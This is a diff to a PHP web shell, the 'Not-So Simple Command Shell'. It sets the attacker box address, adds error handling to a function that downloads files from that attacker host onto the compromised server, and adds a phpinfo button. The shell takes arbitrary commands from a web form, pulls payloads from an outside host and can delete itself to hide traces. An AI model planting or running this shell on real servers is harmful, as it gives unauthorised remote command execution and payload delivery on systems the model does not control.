@@ -6,10 +6,10 @@ function is_post_request() {
 function is_get_request() {
     return $_SERVER['REQUEST_METHOD'] == 'GET';
 }
-// Set these variables to YOUR attack box
-$attackip = "192.168.0.18";
-$attackport = "8000";
 
+// Set these variables to YOUR attack box
+$attackip = "10.0.2.31";
+$attackport = "8000";
 ?>
 <!doctype html>
 <html lang="en">
@@ -41,7 +41,7 @@ $attackport = "8000";
         <div style="border:1px solid #333;width:50%;padding:0px 30px;border-radius:10px;margin:10px 40px;">
         <p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
         <div style="display:inline;margin:10px;"><form style="float:left" action="" method="get">Command? <input type="text" name="cmd" autofocus/>
-        <button type="submit">Execute</button>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?links=1">QuickLinks</a></form><form style="float:right" action="nsscmdshell.php" method="GET"><button name="clean" id="action-button" title="deletes all files uploaded using nsscmdshell.  please note that you must manually remove nsscmdshell."> Cleanup Files </button>&nbsp;&nbsp;<button name="check" id="action-button" title="show var_dump for $_SESSION[\'actions\']"> Show History </button></form></div>
+        <button type="submit">Execute</button>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?links=1">QuickLinks</a></form><form style="float:right" action="nsscmdshell.php" method="GET"><button name="clean" id="action-button" title="deletes all files uploaded using nsscmdshell.  please note that you must manually remove nsscmdshell."> Cleanup Files </button>&nbsp;&nbsp;<button name="check" id="action-button" title="show var_dump for $_SESSION[\'actions\']"> Show History </button>&nbsp;&nbsp;<button name="phpInfo">PHPInfo</button></form></div>
 <p>&nbsp;</p>
         File Options<br>
         <form action="" method="get">
@@ -116,7 +116,13 @@ $attackport = "8000";
                 $_SESSION['actions'][] = $action;
 //				var_dump($_SESSION['actions']);
                 }
-            file_put_contents($_GET['upload'], file_get_contents("http://".$attackip.":".$attackport."/" .$_GET['upload']));
+            if(!file_put_contents($_GET['upload'], file_get_contents("http://".$attackip.":".$attackport."/" .$_GET['upload']))) {
+                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>Upload Failed!</p>');
+            } else {
+                echo '<div style="width:50%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;">
+                          <p>File uploaded successfully.</p>
+                </div>';
+            }
 /*            echo '<pre>';
             var_dump($_SESSION['actions']);
             echo '</pre>';*/
@@ -145,7 +151,11 @@ $attackport = "8000";
             }
 
 if (is_get_request()){
-
+if (isset($_GET['phpInfo'])) {
+//        echo '<pre>';
+        phpinfo();
+//        echo '</pre>';
+     }
     if (isset($_GET['kill_me'])) {
             if (!unlink ('nsscmdshell.php')){
                 die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>File can\'t be deleted.</p>');
@@ -161,7 +171,7 @@ if (is_get_request()){
         $alerts = "";
         foreach($cleans as $clean) {
             if (!unlink ($clean)){
-                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>$clean can\'t be deleted.</p>');
+                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>'. $clean .' can\'t be deleted.</p>');
             }
             else {
             $alerts .= $clean .'<br>';
